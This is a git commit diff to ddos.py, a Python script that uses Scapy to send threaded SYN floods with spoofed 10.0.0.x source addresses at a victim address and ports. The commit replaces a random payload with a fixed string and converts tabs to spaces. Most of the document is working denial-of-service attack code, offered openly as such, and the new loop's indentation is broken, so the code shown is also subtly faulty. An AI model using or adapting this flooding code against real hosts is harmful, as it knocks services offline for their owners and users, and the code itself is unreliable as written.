8238bbf19da29c17508a6fba98ee1031edd6d127
Michael Dresser <michaelmdresser@gmail.com>
2017-10-14 15:32:36 -0600

    no random string, no tabs)

--- ddos.py
+++ ddos.py
@@ -4,17 +4,21 @@ import time
 import random
 
 def sendPackets(victimAddress,victimPort):
-	for port in victimPort:
-		for i in range(1,254):
-			raw = str(createRandomString())
-			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/raw
-			print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
-			ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
+    for port in victimPort:
+    for i in range(1,254):
+        #raw = str(createRandomString())
+        raw = "stuff"
+        packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/raw
+        print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+        ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
+
 
 def startDDOS(victimAddress,victimPort,numThreads):
-	for i in range(1,numThreads):
-		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
-		thread.start()
+    for i in range(1,numThreads):
+        thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
+        thread.start()
+
+
 def createRandomString():
 	min = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 	max = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
